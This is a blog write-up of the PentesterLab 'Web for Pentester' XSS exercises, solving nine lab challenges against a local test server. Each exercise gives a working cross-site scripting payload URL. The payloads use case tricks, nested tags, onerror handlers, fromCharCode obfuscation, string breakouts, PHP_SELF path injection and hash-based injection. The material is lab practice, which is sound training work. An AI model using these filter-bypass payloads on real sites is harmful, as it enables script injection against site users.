---
layout:     post
title:      "Web for Pentester"
subtitle:   "XSS Write-Up"
date:       2016-09-01 6:00:00
author:     "W3ndige"
header-img: "img/cross-site-scripting-header.jpg"
---

<p>Today we're going to continue our journey through the word of web application security - more accurately XSS exercises from <a href="https://pentesterlab.com/">PentesterLab</a>. It's great way to practice what we have learned so far and also - good challenge. Let's jump into the first one!</p>

<h3>Exercise 1</h3>

<p>Here we have a very basic example of Cross Site Scripting where you have to change the variable that is visible in the URL (which is our example is <i>name=hacker</i>) into the alert script that will allow us to see whether if it works. </p>

{% highlight html %}
http://192.168.0.12/xss/example1.php?name=<script>alert("Xss")</script>
{% endhighlight %}

![exercise-1](/img/xss-exercise/exercise-1.png){:class="img-responsive"}

<p>Great, it works perfectly, let's move to the next one!</p>

<h3>Exercise 2</h3>
<p>Firstly I wanted to try whether the method from the previous one works but as I suspected it didn't. What we got after entering script was this source code. </p>

{% highlight html %}
<div class="container">
Hello
alert("Xss")
{% endhighlight %}

<p>It may be somehow filtering our input - maybe changing it to uppercase will help us? </p>   

{% highlight html %}
http://192.168.0.12/xss/example2.php?name=<sCript>alert("Xss")</sCript>
{% endhighlight %}

<p>Great! It works and we've bypassed the filter. Let's move on to the next one! </p>

<h3>Exercise 3</h3>

<p>This one is a little harder - it doesn't allow <b>script</b> or even <b>sCript</b> so we have to try something else. From what I learned about methods to bypass filtering it may be possible to use this simple trick. </p>

{% highlight html %}
http://192.168.0.12/xss/example3.php?name=<scr<script>ipt>alert("Xss")</scr</script>ipt>
{% endhighlight %}

<p>If you don't know how this works - the filter firstly looks for <i>script</i> tag, deletes it, and then sends the result. But after taking out the script two other parts <b>scr</b> and <b>ipt</b> will merge into one creating our payload. </p>

<h3>Exercise 4</h3>

<p>Here it looks like more advanced version of filter, it completely takes out the word script and when the request matches script, it will stop. So what options do we have to bypass it? We can put <b>img</b> tag with some attributes allowing us to create a paylod. Onmouseover will be an excellent example but you can use any other you will think that will work. </p>

{% highlight html %}
http://192.168.0.12/xss/example4.php?name=<img src="blabla" onmouseover="alert('XSS')"></img>
{% endhighlight %}

<p>It will even better work with <b>onerror</b> since it will execute automatically when the page loads. </p>

{% highlight html %}
http://192.168.0.12/xss/example4.php?name=<img src="blabla" onerror="alert('XSS')"></img>
{% endhighlight %}

<h3>Exercise 5</h3>

<p>This one is a little trickier - it allows <b>script</b> tags but doesn't allow <b>alert</b> function. How can we make it alert something without actually typing it? We can translate this into the ASCII characters. </p>

{% highlight html %}
alert("XSS") = 097 108 101 114 116 040 034 088 083 083 034 041
{% endhighlight %}

<p>Which after small redesign will result in actually working XSS!</p>

{% highlight html %}
http://192.168.0.12/xss/example5.php?name=<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>
{% endhighlight %}

<h3>Exercise 6</h3>

<p>This one is a little different. After looking into the source code (which you should always do at the beginning) we get this small JavaScript code. </p>

{% highlight html %}
Hello
<script>
	var $a= "hacker";
</script>
{% endhighlight %}

<p>Vaule of $a changes everytime we enter something different in <b>name=</b> field. We can try to manipulate this script into running alert function. Firstly I add <b>"</b> character to indicate that text is before this quotiation mark. Then let's add <b>;</b> as it's always used in JavaScript at the end of a line. After that I'm ready to add <b>alert('XSS')</b> but it still won't work because of the quotiation mark at the end of the input so let's try commenting it out with <b>//</b>. And it works!</p>

{% highlight html %}
http://192.168.0.12/xss/example6.php?name=me";alert('XSS')//
{% endhighlight %}

<h3>Exercise 7</h3>

<p>Here w're dealing with similar challenge as in the previous one. </p>
{% highlight html %}
Hello
<script>
	var $a= 'hacker';
</script>
{% endhighlight %}

<p>Using the previous strategy I manage to get the XSS alert working. </p>
{% highlight html %}
http://192.168.0.12/xss/example7.php?name=hacker';alert('XSS');//
{% endhighlight %}

<h3>Exercise 8</h3>
<p>Hmmm... We've got the input field that will not allow any of our XSS tricks. I actually had no idea how to attack this example so I checked out hints provided by PentesterLab. Let's take a look at them. </p>

<p><i>Here, the value echoed back in the page is correctly encoded. However, there is still a XSS vulnerability in this page. To build the form, the developer used and trusted PHP_SELF which is the path provided by the user. It’s possible to manipulate the path of the application in order to:</i></p>
<ol>
<li><i>call the current page (however you will get an HTTP 404 page);</i></li>
<li><i>get a XSS payload in the page.</i></li>
</ol>
<p><i>This can be done because the current configuration of the server will call /xss/example8.php when any URL matching /xss/example8.php/... is accessed. You can simply get your payload inside the page by accessing /xss/example8.php/[XSS_PAYLOAD]. Now that you know where to inject your payload, you will need to adapt it to get it to work and get the famous alert box.</i></p>

<p>Wow, I haven't thought about that. Let's see what happens if we simply add it <b>/xss/example8.php/[XSS_PAYLOAD]</b> like in here. </p>

{% highlight html %}
http://192.168.0.12/xss/example8.php/<script>alert("XSS")</script>
{% endhighlight %}

<p>But it still doesn't work. We have to somehow tweak it into the working version. </p>

{% highlight html %}
<form action="/xss/example8.php/<script>alert("XSS")</script>" method="POST">
  Your name:<input type="text" name="name" />
  <input type="submit" name="submit"/>
{% endhighlight %}

<p>If we take a look at it a little closer we can see that if we add <b>"></b> after the example8.php it will close the path and allow script to execute. </p>

{% highlight html %}
http://192.168.0.12/xss/example8.php/"><script>alert("XSS")</script>
{% endhighlight %}

<p>To the last one!</p>

<h3>Exercise 9</h3>
<p>By looking at the source code it reveals to us that the script is simply executing everything after the hash string.</p>
{% highlight html %}
<script>
    document.write(location.hash.substring(1));
</script>
{% endhighlight %}
<p>Solution will look like this. I don't know why but it worked for me only in Chrome browser, not in Firefox. Luckily we managed to complete this set of exercises. </p>
{% highlight html %}
http://192.168.0.12/xss/example9.php#<script>alert("XSs")</script>
{% endhighlight %}

<p>Thanks for tuning in! It was great challenge, and I'm sure to complete other exercise on Web for Pentester ISO. Hopefully there will be more XSS challenges as I'm really enjoying them. Stay updated for more and remember... </p>
<p>~ Stay safe!</p>
